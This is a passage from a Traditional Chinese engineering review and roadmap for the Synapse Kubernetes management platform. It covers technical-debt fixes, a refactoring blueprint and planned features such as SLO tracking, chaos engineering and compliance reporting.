1. 加入 `prev_hash`、`hash` 欄位
2. 建立 `AuditSink` 介面，支援 `file`、`webhook`、`kafka`、`s3`
3. 加入歸檔 worker（90 天以上移到 S3 Glacier）

### P2-3 模型加密範圍太窄 ✅

只有 `Cluster.KubeconfigEnc / CAEnc / SATokenEnc` 加密。其他敏感欄位未加密：

- `LDAPConfig.BindPassword`
- `NotifyChannel.Token / SMTPPassword / SlackWebhook`
- `SIEMWebhookConfig.Secret`
- `AIConfig.APIKey`
- `ArgoCDConfig.Token`
- `CloudBillingConfig.Credentials`

**修正**

1. 在 models 全域檢視 `json:"-"` + 含有憑證語意的欄位
2. 套用 BeforeSave / AfterFind hook
3. 新增 `cmd/admin migrate-encrypt` 命令一次性加密已存明文

### P2-4 資料庫 Migration 機制過於原始 ✅

> **已完成（2026-04-11）**：MySQL 生產環境改用 `golang-migrate/migrate/v4`，嵌入式 SQL 遷移檔案存於 `internal/database/migrations/mysql/`，`schema_migrations` 表追蹤版本。`001_baseline.up.sql` 使用 `CREATE TABLE IF NOT EXISTS`，對既有 AutoMigrate 資料庫安全（no-op）。SQLite 開發環境保留 GORM AutoMigrate。

當前用 `gorm.AutoMigrate` 一次塞 28 張表。問題：

- 無版本控制（上線後無法回滾）
- 無 breaking change 偵測
- 欄位改 `not null` 時 GORM 不一定會修改既有欄位

**方案**

1. 導入 `golang-migrate/migrate` 或 `pressly/goose`
2. 現有 schema dump 為 `migrations/0000_init.sql`
3. 之後所有變更 = 新增 numbered migration file
4. 部署流程：Pod 啟動前跑 `synapse admin migrate up`

### P2-5 前端狀態管理散亂 ✅ 2026-04-11

雖然用 React Query 做資料同步，但全域 UI 狀態（目前叢集、主題、側邊欄）散落在多個 context。

**方案 — 已完成**

引入 `zustand ^5.0.12`，三個獨立 store：

```ts
// ui/src/store/useSessionStore.ts  — 登入使用者 reactive 狀態
// ui/src/store/useClusterStore.ts  — activeClusterId + clusters 清單
// ui/src/store/useUIStore.ts       — sidebarCollapsed (persist 到 localStorage)
// ui/src/store/index.ts            — barrel export
```

- `useSessionStore.setSession()` 在 App.tsx `useAuthInit` silent refresh 成功後呼叫
- `useClusterStore.setActiveClusterId()` 在 ClusterSelector 切換時同步
- `useUIStore` 用 zustand `persist` middleware，sidepanel 收合狀態跨頁面保留
- PermissionContext 不動（R3-4 風險評估：高開銷 vs 低收益），新程式碼改用 Zustand stores

### P2-6 無 Feature Flag ✅ 2026-04-11

上線新功能時沒有逐步放量機制，出問題只能整版 rollback。

**方案 — 已完成（簡單方案）**

採用方案一（DB-backed store），不依賴外部服務：

- `internal/models/feature_flag.go` — `FeatureFlag` model（string primary key = flag key）
- `internal/features/db_store.go` — 實作 `features.Store` 介面，30s TTL 記憶體快取 + `Invalidate()` 即時清除
- `internal/services/feature_flag_service.go` — `ListFlags / SetFlag` CRUD
- `internal/handlers/feature_flag_handler.go` — `List / Update` HTTP handler
- `internal/router/routes_system.go` — `GET/PUT /system/feature-flags` 掛在 PlatformAdminRequired 群組
- `internal/router/router.go` — startup 呼叫 `features.SetStore(featureDBStore)` 替換預設 env store
- `internal/database/migrations/mysql/003_feature_flags.up.sql` — 建表 + 預填六個已知 flag
- `internal/database/database.go` — `autoMigrate` 新增 `FeatureFlag`

快取策略：`DBStore.IsEnabled()` 優先讀記憶體（< 30s）；管理員 `PUT` 觸發 `Invalidate()` 使下一次請求立即回源。

### P2-7 前端 i18n 僅一種語言 ✅ 2026-04-12

目前 locales 有建構但實際多為中文硬編碼或只支援一種語系。

**修正 — 已完成**

1. ✅ 建立 `ui/scripts/i18n-lint.mjs` — 掃描 `src/**/*.tsx/.ts` 中硬編碼中文字元，支援 `// i18n-ignore` 行內豁免、跳過 block comment / import / console 語句
2. ✅ CI `frontend-lint` job 新增 `MAX_VIOLATIONS=1470 npm run i18n-lint` 步驟；基線 1470 條，新增硬編碼中文即 fail
3. ✅ 補齊 en-US 漏譯：`common.language.zhTW`、`common.units.count`、`components.monitoringCharts.times`
4. ✅ 補齊 zh-TW / zh-CN 未翻譯：`components.kubectlTerminal.welcomeLine1/2/3`（原為英文原文）

**使用方式**

```bash
npm run i18n-lint                      # 基線檢查（MAX_VIOLATIONS=0，適合新功能開發後驗證）
MAX_VIOLATIONS=1470 npm run i18n-lint  # CI 模式（允許既有負債）
```

**降低負債說明**：現有 1470 條違規均為既有技術債（元件硬編碼中文）。後續每次重構相關頁面時同步提取到 i18n，並調降 `MAX_VIOLATIONS`，直到歸零。

### P2-8 K8s Informer 無健康檢查 ✅ 2026-04-11

當前 informer 啟動後若某個叢集 API 壞掉、或 RBAC 變更導致 watch 失敗，informer 可能 silently 停擺，前端還是拿到舊資料。

**修正 — 已完成**

1. ✅ `ClusterInformerManager.HealthCheck() map[uint]InformerHealth` — 純記憶體讀取，`/readyz` 已整合，`InformerHealth` 新增 `StartedAt` 欄位
2. ✅ `/readyz` 已納入 informer 狀態（`k8s_informers.total/synced`，僅作資訊用途，不影響 pod readiness）
3. ✅ `StartHealthWatcher(interval=1m, stuckThreshold=5m)` — 背景 goroutine 週期掃描 `started && !synced && age > 5m` 的 runtime，自動呼叫 `StopForCluster` + `EnsureForCluster` 重啟；router 啟動時呼叫
4. ✅ `restartStuckInformers` 單元測試 4 個（`health_test.go`）：synced 不重啟、新 unsynced 不重啟、stuck nil-model 移除、`StartedAt` 正確曝露

**範圍說明**：auto-restart 針對「啟動但 5 分鐘未同步」場景（初始 sync 卡住）。已完成同步的 informer 若連線中斷，client-go 會自動 reconnect，Synapse 無需額外介入。

### P2-9 前端無 Bundle Size 監控 ✅ 2026-04-11

`ui/dist` 無 bundle size budget，引入新套件可能導致首屏變慢。

**方案 — 已完成**

1. ✅ 安裝 `rollup-plugin-visualizer ^7.0.1`；`VISUALIZE=true npm run build` 產出 `dist/stats.html`（互動式 treemap）
2. ✅ `ui/scripts/check-bundle-size.mjs` — 掃描 `dist/assets/*.js`；預設預算：總體 < 12 MB、非 vendor chunk < 3 MB；CI 超標時 exit 1
3. ✅ `npm run bundle-size` 腳本；CI `frontend-build` job 加入 `Check bundle size budget` 步驟
4. ✅ `React.lazy` + 外層 `Suspense` 延遲載入 11 個重量頁面：
   - `YAMLEditor`（monaco editor）、`KubectlTerminalPage`（xterm.js）
   - `MonitoringCenter`、`CostDashboard`、`GlobalCostInsights`
   - `ArgoCDConfigPage`、`ArgoCDApplicationsPage`
   - `HelmList`、`CRDList`、`CRDResources`
   - `SecurityDashboard`、`CertificateList`、`MultiClusterPage`、`PipelineRunDemo`
5. ✅ `vite.config.ts` 細化 `manualChunks`：`vendor/antd/monaco/charts/i18n/query/router` 七個 chunk

**使用方式**

```bash
npm run build:analyze   # 產出 dist/stats.html（bundle treemap）
npm run bundle-size     # 檢查 dist/assets/ 大小預算
TOTAL_BUDGET_MB=10 npm run bundle-size  # 自訂預算
```

---

## 四、低等級 (P3 — 持續改善)

| 項次  | 描述                                                    | 建議                                    |
| ----- | ------------------------------------------------------- | --------------------------------------- |
| P3-1  | `fmt.Println` 出現在 runbooks.go                        | 替換為 `logger.Info`                    |
| P3-2  | 20 處 `InsecureSkipVerify: true` 需逐一檢視 nolint 註解 | 加 TLS 憑證註冊機制                     |
| P3-3  | JWT MapClaims                                           | 改用強型別 `jwt.Claims` struct          |
| P3-4  | Makefile 缺 `make lint` / `make security` targets       | 新增 golangci-lint、gosec 整合          |
| P3-5  | 無 SBOM (Software Bill of Materials)                    | 加入 `syft` 產生 SBOM                   |
| P3-6  | 無 container image signing                              | 引入 cosign                             |
| P3-7  | `deploy/docker-compose.yaml` 用 root 跑                 | 切 non-root user                        |
| P3-8  | `synapse` binary 142MB (!!)                             | 檢查是否有未必要的 embed / debug symbol |
| P3-9  | 無一致的分頁工具                                        | 建立 `response.Paginate[T]` helper      |
| P3-10 | 前端 error handling 散落各頁                            | 建立 `useErrorHandler` hook             |

### P3-8 深入：Synapse Binary 142MB 分析

142MB 對單一 Go binary 來說異常。可能原因：

1. `embed` 嵌入整個 `ui/dist`（合理，通常 5~10MB）
2. 未 strip debug symbols (`go build -ldflags="-s -w"`)
3. 引入過多 k8s client-go GVK，編譯產生大量 stubs

**驗證方法**

```bash
go tool nm -size synapse | sort -nr | head -40
go build -ldflags="-s -w" -o synapse-stripped .
upx --best synapse-stripped # 可選
```

目標：< 60MB

---

## 五、重構藍圖

### 5.1 目標架構

```
┌─────────────────────────────────────────────────────────────┐
│                      Presentation Layer                     │
│  ┌──────────────┐  ┌──────────────┐  ┌─────────────────┐    │
│  │ HTTP (Gin)   │  │ WebSocket    │  │ gRPC (future)   │    │
│  └──────┬───────┘  └──────┬───────┘  └────────┬────────┘    │
└─────────┼──────────────────┼───────────────────┼────────────┘
          │                  │                   │
┌─────────┼──────────────────┼───────────────────┼────────────┐
│                    Application Layer                        │
│  ┌──────▼─────────┐  ┌────▼────────┐  ┌───────▼─────────┐   │
│  │  Handlers      │  │ WS Hubs     │  │ gRPC Servers    │   │
│  │  (thin)        │  │             │  │                 │   │
│  └──────┬─────────┘  └──────┬──────┘  └────────┬────────┘   │
└─────────┼────────────────────┼──────────────────┼──────────┘
          │                    │                  │
┌─────────┼────────────────────┼──────────────────┼──────────┐
│                     Domain Service Layer                   │
│  ┌──────▼──────────────┐ ┌──▼────────────┐ ┌──▼──────────┐ │
│  │ ClusterSvc          │ │ WorkloadSvc   │ │ CostSvc     │ │
│  │ PermissionSvc       │ │ StorageSvc    │ │ AuditSvc    │ │
│  │ AuthSvc             │ │ NetworkSvc    │ │ MetricSvc   │ │
│  │ (interfaces)        │ │ SecuritySvc   │ │ AISvc       │ │
│  └──────┬──────────────┘ └──┬────────────┘ └──┬──────────┘ │
└─────────┼────────────────────┼──────────────────┼──────────┘
          │                    │                  │
┌─────────┼────────────────────┼──────────────────┼──────────┐
│                    Infrastructure Layer                    │
│  ┌──────▼────────┐ ┌─────────▼──────┐ ┌─────────▼───────┐  │
│  │ Repository    │ │ K8s Client     │ │ External HTTP   │  │
│  │ (GORM wrapper)│ │ (Informer+     │ │ (Prom/Grafana/  │  │
│  │               │ │  Live+Dynamic) │ │  ArgoCD/AI)     │  │
│  └──────┬────────┘ └─────────┬──────┘ └─────────┬───────┘  │
└─────────┼────────────────────┼──────────────────┼──────────┘
          │                    │                  │
   ┌──────▼──────┐      ┌──────▼──────┐    ┌──────▼──────┐
   │ MySQL /     │      │ K8s Clusters│    │ Prometheus/ │
   │ SQLite      │      │             │    │ Grafana/etc │
   └─────────────┘      └─────────────┘    └─────────────┘
```

### 5.2 關鍵重構動作

#### 動作 1 — 引入 Repository 層

```go
// internal/repository/cluster.go
type ClusterRepository interface {
    GetByID(ctx context.Context, id uint) (*models.Cluster, error)
    List(ctx context.Context, q ClusterQuery) ([]*models.Cluster, error)
    Create(ctx context.Context, c *models.Cluster) error
    Update(ctx context.Context, c *models.Cluster) error
    SoftDelete(ctx context.Context, id uint) error
}

type gormClusterRepo struct {
    db *gorm.DB
}

func (r *gormClusterRepo) GetByID(ctx context.Context, id uint) (*models.Cluster, error) {
    var c models.Cluster
    if err := r.db.WithContext(ctx).First(&c, id).Error; err != nil { ... }
    return &c, nil
}
```

**原則**：

- 所有 `gorm.DB` 呼叫只能在 `repository/` 裡
- service 依賴 repository **介面**，非具體實作
- handler 不直接認識 repository

#### 動作 2 — Service Interface 化

1. `internal/services/` 維持現狀（結構體實作）
2. `internal/services/contracts/` 新增介面定義
3. `handlers` 改為依賴 `contracts.XxxService`
4. `mockery` 產生 `mocks/`

#### 動作 3 — 路由拆分

```
internal/router/
  router.go               // Setup() 主入口
  deps.go                 // 所有依賴匯集
  middleware.go           // Gin middleware 註冊
  routes_auth.go          // /auth/*
  routes_user.go          // /users/*
  routes_cluster.go       // /clusters/*（僅叢集基本 CRUD）
  routes_workload.go      // /clusters/:id/{deployments,statefulsets,...}
  routes_network.go       // /clusters/:id/{services,ingresses,gateways,...}
  routes_storage.go       // /clusters/:id/{pvcs,pvs,storageclasses}
  routes_security.go      // /clusters/:id/{rbac,networkpolicies,cert-manager}
  routes_observability.go // /clusters/:id/{monitoring,alerts,logs}
  routes_cost.go          // /clusters/:id/{cost,billing,resources}
  routes_ai.go            // /clusters/:id/ai/*
  routes_system.go        // /system/*
  routes_ws.go            // /ws/*
```

每個檔案 < 300 行。

#### 動作 4 — DTO 驗證統一

```go
// internal/handlers/dto/deployment.go
type CreateDeploymentRequest struct {
    Name      string            `json:"name" binding:"required,min=1,max=253,k8sname"`
    Namespace string            `json:"namespace" binding:"required,k8sname"`
    Image     string            `json:"image" binding:"required"`
    Replicas  int32             `json:"replicas" binding:"gte=0,lte=100"`
    Labels    map[string]string `json:"labels" binding:"dive,keys,k8slabelkey,endkeys,k8slabelvalue"`
}
```

自訂 `validator.RegisterValidation("k8sname", validateK8sName)` 等 tag。

#### 動作 5 — 錯誤處理統一管道

目前 `apierrors.AppError` 已存在但未普遍使用。

1. 所有 service 方法返回 `AppError` 或 `wrapped error`
2. Handler 層統一使用 helper：
   ```go
   if err != nil {
       response.FromError(c, err) // 自動判別 AppError / gorm / k8serrors
       return
   }
   ```
3. `response.FromError` 負責：
   - `AppError` → 用其 `HTTPStatus` + `Code`
   - `gorm.ErrRecordNotFound` → 404
   - `k8serrors.IsNotFound` → 404
   - `k8serrors.IsForbidden` → 403
   - 其餘 → 500 + RequestID

### 5.3 不重構的地方

不是什麼都要重寫。以下維持現狀：

- `pkg/crypto` — 設計良好的 KeyProvider 抽象
- `internal/middleware/request_id.go` — OK
- `internal/metrics` — Prometheus 整合 OK
- `ClusterInformerManager` — 核心設計合理，只需補 health check
- 前端 `services/` 層 — API 封裝已足夠好

---

## 六、功能深度拓展

以下是在「修完技術債」之後可以考慮的功能深化方向，按優先序排列：

> **🤖 模型分工速查**（詳見 §十五.3 跨 Phase 常駐任務）
>
> | 子題                           | 主力模型                                         | 簡要原因                                                                                      |
> | ------------------------------ | ------------------------------------------------ | --------------------------------------------------------------------------------------------- |
> | 6.1 GitOps 整合深化            | **Opus**                                         | 原生 GitOps / ArgoCD 邊界、外部控制器整合、PR preview dry-run，與 CICD §25.2 M16 邏輯高度重疊 |
> | 6.2 AI 能力深化                | **Opus**                                         | prompt 設計、context 組裝、AI 審批的邊界條件                                                  |
> | 6.3 多叢集拓撲進化             | Opus（設計）+ **Sonnet**（實作）                 | 拓撲演算法 Opus 定調，視覺化與頁面 Sonnet                                                     |
> | 6.4 安全治理加強               | **Opus** 全程                                    | cosign/SBOM/OPA 均為安全關鍵，不可降級                                                        |
> | 6.5 開發者體驗（CLI / VSCode） | **Sonnet**                                       | CLI 與 extension 為包裝層，依既有 service                                                     |
> | 6.6 成本分析深化               | Opus（演算法）+ **Sonnet**（UI）                 | Rightsizing 預測演算法 Opus，報表 UI Sonnet                                                   |
> | 6.7 SLO / SLI 管理             | **Opus**（Burn rate）+ **Sonnet**（UI）          | Error Budget 燃燒率演算法屬決策核心                                                           |
> | 6.8 混沌工程                   | **Sonnet**                                       | Chaos Mesh 整合屬 adapter，實驗定義屬 CRUD                                                    |
> | 6.9 Audit + Compliance         | **Opus** 全程                                    | SOC2/ISO27001 對應需嚴格正確性                                                                |
> | 6.10 使用者自助化              | **Sonnet**（工作流）+ **Opus**（quota 審批邏輯） | 自助申請流程 Sonnet，配額決策 Opus                                                            |

### 6.1 GitOps 整合深化

- 先落地原生 GitOps 與 ArgoCD 代理的清楚邊界（參見 `docs/CICD_ARCHITECTURE.md §12.1`）
- Flux CD 整合可作為後續外部控制器 adapter，但不得與同一個 GitOpsApp 混用
- Git repo 關聯視圖：從 Deployment 反查最後修改的 commit
- Pull Request preview：對 PR 裡的 YAML 做 dry-run diff

### 6.2 AI 能力深化 ✅（部分，2026-04-11）

目前有 `ai_chat`、`ai_nlquery`、`ai_runbook`。可再加：

- ✅ **AI 根因分析**：Pod 崩潰時自動抓 events + logs + metrics 生成分析報告
  - `internal/services/ai_rca.go` — `RCAService.AnalyzePod()` 收集 Pod events/logs/container statuses/owner refs，送 AI 分析
  - `internal/handlers/ai_rca.go` — `POST /clusters/:clusterID/ai/rca`（60s timeout）
  - `ui/src/services/aiService.ts` — `analyzeRootCause(clusterId, namespace, podName)`
- **容量規劃助手**：基於 Prometheus 歷史資料預測未來 1/3/6 個月資源需求
- **AI 生成 YAML**：對話式建立 Deployment/HPA/NetworkPolicy
- **AI 審批助手**：PR review by LLM（整合 cert-manager 等敏感資源變更）

### 6.3 多叢集拓撲進化 ✅ 2026-04-11

> **已完成（2026-04-11）**：聯邦拓樸視角與跨叢集連線視覺化。

**本次交付**

| 檔案 | 內容 |
|------|------|
| `internal/services/multicluster_topology.go` | `GetMultiClusterTopology(ctx, []ClusterTopoInput)` — 並行抓取各叢集拓樸，globalise node/edge ID（前綴 `{clusterID}:`），偵測 `synapse.io/cross-cluster` annotation 產生 `CrossEdge` |
| `internal/handlers/multicluster_topology.go` | `MultiClusterTopologyHandler.GetMultiClusterTopology` — 解析 `clusterIDs` query param，最多 10 個；無法連線的叢集 graceful skip（空 section），不中斷整體回應 |
| `internal/router/router.go` | `GET /api/v1/network/multi-cluster-topology?clusterIDs=1,2,3`（全域路由，不在 `/clusters/:clusterID/` 下） |
| `ui/src/services/networkTopologyService.ts` | 新增 `ClusterSection` / `CrossEdge` / `MultiClusterTopology` 型別；`getMultiClusterTopology(clusterIDs[])` API call |
| `ui/src/pages/multicluster/MultiClusterTopologyGraph.tsx` | React Flow 聯邦圖：`ClusterGroupNode`（彩色 header group）+ Dagre 各叢集子佈局；跨叢集邊以紫色虛線 + ArrowClosed marker 呈現 |
| `ui/src/pages/multicluster/MultiClusterTopologyPage.tsx` | 叢集多選器（最多 10）+ 「查看拓樸」觸發查詢；顯示節點數 / 跨叢集連線數統計；無跨叢集連線時提示 annotation 使用方式 |
| `ui/src/pages/multicluster/index.tsx` | 新增「聯邦拓樸」Tab（置於第一位） |

**跨叢集連線宣告方式**

```yaml
# 在 Service 加入 annotation 宣告依賴另一個叢集的 service
apiVersion: v1
kind: Service
metadata:
  name: frontend
  namespace: production
  annotations:
    synapse.io/cross-cluster: "42/production/payment-service"
    #                          ^^ targetClusterID / namespace / service-name
```

**設計決策**
- Node ID 全域化：`{clusterID}:workload/ns/kind/name` — 避免多叢集 ID 衝突，React Flow 可直接使用
- 空叢集 graceful degradation：K8s 連線失敗的叢集仍顯示空方塊，不隱藏
- 跨叢集 failover drill 模擬 — 留待 Phase 4（需接 Chaos Mesh / LitmusChaos）

- ✅ Cluster Federation 視角：把多個叢集當作邏輯一體展示
- ✅ 跨叢集 traffic flow 視覺化（annotation-based）
- ⏳ 多叢集 failover drill 模擬（Phase 4）

### 6.4 安全治理加強 ✅（部分，2026-04-11）

- 映像簽章驗證（cosign）
- SBOM 比對：上線版本 vs 最新掃描結果
- OPA/Gatekeeper 政策編輯器 + dry-run
- ✅ **Secrets sprawl 掃描**：追蹤 Secret 被掛載到哪些 Pod，識別孤立/過度暴露的 Secret
  - `internal/services/security_audit_service.go` — `SecurityAuditService.ScanSecretSprawl()` 列出 Secret、追蹤 Pod volume/env/envFrom 掛載、分類 orphaned/over_exposed/active
  - `internal/handlers/security_audit.go` — `GET /clusters/:clusterID/security/secret-sprawl?namespace=`
  - `ui/src/services/securityService.ts` — `scanSecretSprawl(clusterId, namespace?)`
- SSL 憑證到期提醒（已有 worker，可加 Email/Slack 通知深化）

### 6.5 開發者體驗 (DevEx)

- `synapse-cli`：對應 UI 功能的 CLI 工具（基於同一套 service）
- `synapse-vscode`：VSCode extension 整合 context switch + log tail
- 一鍵 `kubectl` context 同步到 kubeconfig 檔案

### 6.6 成本分析深化 ✅（部分，2026-04-11）

目前已有 cost dashboard + 浪費識別 + 雲帳單整合。可再加：

- ✅ **每個 Namespace 的預算設定與超支告警**
  - `internal/models/namespace_budget.go` — `NamespaceBudget` model（CPU/Memory/Cost 上限 + 告警閾值）
  - `internal/services/cost_budget_service.go` — `CostBudgetService` CRUD + `CheckBudgets()` 比對 informer 實際用量
  - `internal/handlers/cost_budget.go` — `GET/PUT/DELETE /clusters/:clusterID/cost/budgets` + `GET /check`
  - `internal/database/migrations/mysql/004_namespace_budgets.up.sql` — 建表遷移
  - `ui/src/services/costService.ts` — `listBudgets/upsertBudget/deleteBudget/checkBudgets`
- Rightsizing 自動建議（基於 VPA + Prometheus 歷史）
- FinOps 報告自動生成（月報 / 季報 PDF）
- Reserved Instance / Savings Plan 模擬

### 6.7 SLO / SLI 管理 ✅ 2026-04-12

#### 交付內容

| 層         | 檔案                                                              | 說明                                                   |
| ---------- | ----------------------------------------------------------------- | ------------------------------------------------------ |
| 模型       | `internal/models/slo.go`                                         | SLO GORM 模型；`$window` 佔位符說明                    |
| 服務       | `internal/services/slo_service.go`                               | CRUD + `GetSLOStatus`（多視窗 SLI / burn rate 計算）   |
| Prometheus | `internal/services/prometheus_service.go` （末尾新增）           | `QueryInstantScalar`（`/api/v1/query` instant 查詢）   |
| Handler    | `internal/handlers/slo_handler.go`                               | List / Get / Create / Update / Delete / GetStatus      |
| 路由       | `internal/router/routes_cluster_slo.go`                          | `GET/POST /slos`, `GET/PUT/DELETE/GET /slos/:id/status` |
| 遷移       | `internal/database/migrations/mysql/006_slos.{up,down}.sql`      | `slos` 表建立 / 刪除                                   |
| 前端服務   | `ui/src/services/sloService.ts`                                  | TypeScript API 呼叫封裝                                |
| 前端頁面   | `ui/src/pages/slo/index.tsx`                                     | SLO 列表頁（搜尋、啟停、刪除）                          |
| 前端表單   | `ui/src/pages/slo/SLOFormModal.tsx`                              | 新增 / 編輯 Modal（Target、PromQL、BurnRate）           |
| 狀態抽屜   | `ui/src/pages/slo/SLOStatusDrawer.tsx`                           | 即時 SLI + Error Budget + 四視窗燃燒率 Drawer           |

#### 設計決策

- **SLI 計算兩模式**：`TotalQuery` 留空 → PromQL 直接回傳 0-1 比率；填入 → `SLI = good / total`
- **`$window` 佔位符**：PromQL 中 `$window` 在服務層替換為目前計算視窗（1h / 6h / 24h / SLO window）
- **燃燒率公式**：`(1 − SLI) / (1 − target)`；≥ critical → "critical"；≥ warning → "warning"；其餘 → "ok"
- **Prometheus 不可用時**：`GetSLOStatus` 回傳 `{status: "unknown", has_data: false}`，不影響頁面載入
- **MySQL Migration 006**：獨立 `slos` 表；`window` 為 MySQL 保留字，以反引號包裹
- **SQLite AutoMigrate**：`&models.SLO{}` 已加入 `database.go`

#### 後續擴充（Phase 4）

- 與 AlertManager 整合：燃燒率超閾值自動推送告警
- 與 PagerDuty / Opsgenie 整合
- 事後檢討範本自動生成（AI 根因分析輔助）

### 6.8 混沌工程 (Chaos Engineering) ✅ 2026-04-12

**交付清單**

| 層次        | 檔案                                                    | 說明                                            |
| ----------- | ------------------------------------------------------- | ----------------------------------------------- |
| Service     | `internal/services/chaos_service.go`                    | Chaos Mesh 偵測、實驗 CRUD、排程列表            |
| Handler     | `internal/handlers/chaos_handler.go`                    | REST 薄層，`resolveDyn` 取得動態 client         |
| Router      | `internal/router/routes_cluster_chaos.go`               | `/chaos/status`、`/chaos/experiments`、`/chaos/schedules` |
| Frontend    | `ui/src/services/chaosService.ts`                       | API client，所有 Chaos Mesh DTO 型別             |
| Frontend    | `ui/src/pages/chaos/index.tsx`                          | 實驗列表頁：狀態 Alert、搜尋篩選、刪除確認      |
| Frontend    | `ui/src/pages/chaos/ChaosFormModal.tsx`                 | 建立實驗 Modal（PodChaos / NetworkChaos / StressChaos） |
| Frontend    | `ui/src/pages/chaos/ChaosDetailDrawer.tsx`              | 實驗詳情 Drawer（Spec JSON 展示）               |
| Menu        | `ui/src/layouts/AppSider.tsx`                           | 新增「混沌工程」選單項，路徑 `/chaos`           |
| Route       | `ui/src/App.tsx`                                        | `clusters/:clusterId/chaos` lazy route          |

**架構決策**

- **動態 client 而非 typed client**：Chaos Mesh 所有資源均為 CRD，統一使用 `dynamic.NewForConfig(k8sClient.GetRestConfig())` — 與 `mesh_handler.go`、`volume_snapshot_handler.go` 一致
- **Observer pattern**：`IsChaosMeshInstalled` 透過 Discovery API 檢查 `chaos-mesh.org/v1alpha1`，未安裝時前端顯示 Alert 而非錯誤頁
- **並發 GVR 列表**：`ListExperiments` 對 5 種 CRD（PodChaos/NetworkChaos/StressChaos/HTTPChaos/IOChaos）並發 goroutine 查詢，單個 GVR 缺失不中斷整體結果
- **isChaosNotFound**：區分「CRD 不存在」（graceful）與「真正 API 錯誤」（回傳 500）

**第二輪擴展（2026-04-12）✅**

| 層次    | 檔案                                                | 說明                                                              |
| ------- | --------------------------------------------------- | ----------------------------------------------------------------- |
| Service | `chaos_service.go`                                  | `CreateSchedule`、`DeleteSchedule`、`HasActiveExperiments` 方法    |
| Handler | `chaos_handler.go`                                  | `CreateSchedule`、`DeleteSchedule` 端點                           |
| Router  | `routes_cluster_chaos.go`                           | `POST /schedules`、`DELETE /schedules/:namespace/:name`           |
| Service | `slo_service.go`                                    | `SLOStatus.ChaosActive bool` 欄位                                 |
| Handler | `slo_handler.go`                                    | `GetSLOStatus` 後注入混沌檢查，需注入 `k8sMgr` + `ChaosService`   |
| Router  | `routes_cluster_slo.go`                             | `NewSLOHandler` 傳入 `k8sMgr` 與 `chaosSvc`                      |
| FE svc  | `chaosService.ts`                                   | `CreateScheduleRequest`、`createSchedule`、`deleteSchedule`       |
| FE page | `chaos/index.tsx`                                   | 改為 Tabs：「實驗」+ 「排程」；注入中顯示 SLO 暫停 Alert Banner  |
| FE page | `chaos/ScheduleFormModal.tsx`                       | 建立 Schedule Modal（Cron 預設 + PodChaos/NetworkChaos/StressChaos）|
| FE page | `slo/SLOStatusDrawer.tsx`                           | `chaos_active=true` 時顯示「混沌暫停」Banner 與 Badge             |
| FE svc  | `sloService.ts`                                     | `SLOStatus.chaos_active: boolean`                                 |

**架構決策（第二輪）**

- **Schedule 複用 `buildChaosSpec`**：Schedule 的內層 spec 與 Experiment spec 結構相同，重構 `buildChaosObject` 使其委派到 `buildChaosSpec`，Schedule 創建函數直接呼叫 `buildChaosSpec` 避免重複
- **混沌連動為 best-effort**：`HasActiveExperiments` 失敗（Chaos Mesh 未安裝或 API 逾時）不影響 SLO 狀態回傳；僅有 `has_data=true` 時才觸發混沌檢查，減少不必要的 K8s API 呼叫
- **動態 client 在 handler 層創建**：`SLOHandler.GetSLOStatus` 需要 dynamic client 做混沌檢查，依照專案模式使用 `dynamic.NewForConfig(k8sClient.GetRestConfig())`；`k8sMgr` 和 `chaosSvc` 透過建構子注入，nil-safe

**未來擴展**

- AI 根因分析結合評分（Phase 4）

### 6.9 Audit + Compliance ✅ 2026-04-12

- SOC2 / ISO27001 / CIS Kubernetes Benchmark 對應報告生成
- 合規證據收集器（自動截圖+匯出）
- 違規事件時間線

**已完成交付**

| 層 | 檔案 | 說明 |
|----|------|------|
| Model | `internal/models/compliance.go` | `ComplianceReport`、`ComplianceEvidence`、`ViolationEvent` 三個模型；ViolationEvent 使用 `fingerprint` 唯一索引避免重複匯入 |
| Service | `internal/services/compliance_service.go` | 合規報告生成（背景 goroutine）、框架控制項評估（SOC2 10 項 / ISO27001 10 項 / CIS 13 項）、違規時間線 CRUD、證據收集 |
| Handler | `internal/handlers/compliance.go` | 11 個端點：報告 CRUD + 匯出、違規時間線 + 統計 + 解決、證據擷取 + 列表 |
| Router | `internal/router/routes_cluster_compliance.go` | `/clusters/:clusterID/compliance/{reports,violations,evidence}` |
| DB | `internal/database/database.go` | AutoMigrate 新增三個模型 |
| Frontend Service | `ui/src/services/complianceService.ts` | API client，完整型別定義 |
| Frontend Page | `ui/src/pages/compliance/index.tsx` | 三 Tabs：合規報告（產生 + 分數 + Drawer 詳情 + JSON 匯出）、違規時間線（篩選 + 統計卡片 + 標記解決）、證據收集（列表 + JSON 檢視） |
| i18n | `locales/{zh-TW,zh-CN,en-US}/compliance.json` | 完整三語翻譯 |
| Menu | `AppSider.tsx` | 「合規管理」選單項，位於「雲原生觀測」子選單 |
| Route | `App.tsx` | `/clusters/:clusterId/compliance` lazy-loaded |

**設計決策**

1. **違規事件持久化**：ViolationEvent 寫入 DB 而非即時查詢，可快速回溯歷史並追蹤解決狀態
2. **框架控制項硬編碼**：SOC2/ISO27001/CIS 控制項為靜態 Go map，不需 DB 管理；版本隨 release 更新
3. **報告產生背景執行**：`GenerateReport` 建立 pending 記錄後 go routine 評估，避免 HTTP timeout
4. **指紋去重**：ViolationEvent.Fingerprint (SHA-256) 唯一索引，SyncViolationsFromScan/Bench 使用 FirstOrCreate 避免重複

### 6.10 使用者自助化

- Namespace self-service 申請工作流（整合審批）
- 自助 quota 申請
- PVC / DB 一鍵還原

---

## 七、未來方向路線圖

### 7.1 技術棧演進

| 層級     | 現在            | 短期（3 個月） | 中期（6 個月）           | 長期（12 個月）     |
| -------- | --------------- | -------------- | ------------------------ | ------------------- |
| Go 版本  | 1.25            | 1.25           | 1.26                     | 1.27                |
| Web 框架 | Gin             | Gin            | Gin + huma               | huma + gRPC-gateway |
| DB       | SQLite + MySQL  | +PostgreSQL    | +TiDB (for multi-region) | CockroachDB option  |
| Cache    | 無              | Redis          | Redis Cluster            | Dragonfly           |
| Queue    | 無 (goroutine)  | asynq (Redis)  | NATS JetStream           | NATS + Temporal     |
| 追蹤     | 無              | OTel + Tempo   | OTel + Jaeger + Tempo    | Full APM            |
| 前端     | React 19 + Vite | + Zustand      | + module federation      | micro-frontends     |
| Auth     | Local + LDAP    | + OIDC         | + SAML                   | + SCIM provisioning |

### 7.2 部署型態演進

- **現在**：單 binary + embedded UI，一個 Pod
- **3 個月**：Helm Chart 化，支援 HA (2+ replicas) + Redis backend
- **6 個月**：Operator 模式，透過 CRD 管理 Synapse instance + `SynapseCluster` CRD
- **12 個月**：Synapse as a Service：SaaS 版本，多 tenant，地理分佈式

